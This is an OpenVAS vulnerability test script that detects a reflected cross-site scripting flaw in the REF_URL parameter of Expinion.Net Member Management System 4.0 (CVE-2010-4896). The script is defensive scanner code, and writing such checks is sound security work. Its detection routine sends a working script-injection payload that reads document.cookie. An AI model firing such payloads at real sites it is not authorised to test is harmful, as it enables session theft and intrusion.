###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_member_management_system_xss_vuln.nasl 4625 2016-11-25 07:14:52Z cfi $
#
# Expinion.Net Member Management System 'REF_URL' Parameter Cross-Site Scripting Vulnerability
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will allow remote attackers to insert
arbitrary HTML and script code, which will be executed in a user's browser
session in the context of an affected site.

Impact Level: Application";

tag_affected = "Expinion.Net Member Management System version 4.0 and prior.";

tag_insight = "The flaw is due to improper validation of user-supplied input
via the 'REF_URL' parameter to admin/index.asp, Which allows attacker to
execute arbitrary HTML and script code on the user's browser session in
the security context of an affected site.";

tag_solution = "No solution or patch was made available for at least one year
since disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one.";

tag_summary = "The host is running Member Management System and is prone to
cross site scripting vulnerability.";

if(description)
{
  script_id(802352);
  script_version("$Revision: 4625 $");
  script_cve_id("CVE-2010-4896");
  script_bugtraq_id(43109);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2016-11-25 08:14:52 +0100 (Fri, 25 Nov 2016) $");
  script_tag(name:"creation_date", value:"2011-12-06 11:26:13 +0530 (Tue, 06 Dec 2011)");
  script_name("Expinion.Net Member Management System 'REF_URL' Parameter Cross-Site Scripting Vulnerability");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/41362");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/61703");
  script_xref(name : "URL" , value : "http://pridels-team.blogspot.com/2010/09/member-management-system-v-40-xss-vuln.html");

  script_tag(name:"qod_type", value:"remote_vul");
  script_summary("Check if Expinion.Net Member Management System is vulnerable to XSS");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Get HTTP port
mmsPort = get_http_port(default:80);
if(!mmsPort){
  exit(0);
}

## Check Host Supports ASP
if(!can_host_asp(port:mmsPort)) {
  exit(0);
}

foreach dir (make_list("/mms", "/MMS", cgi_dirs()))
{
  ## Send and Receive the response
  sndReq = http_get(item:string(dir, "/admin/index.asp"), port:mmsPort);
  rcvRes = http_send_recv(port:mmsPort, data:sndReq);

  ## Confirm application is Member Management System
  if(">Member Management System Administration Login<" >< rcvRes)
  {
    ## Path of Vulnerable Page
    url = dir + '/admin/index.asp?REF_URL="<script>alert(document.cookie)' +
                '</script>';

    ## Send XSS attack and check the response to confirm vulnerability.
    if(http_vuln_check(port:mmsPort, url:url, pattern:"<script>alert" +
                                 "\(document.cookie\)</script>", check_header:TRUE))
    {
       security_message(mmsPort);
       exit(0);
    }
  }
}
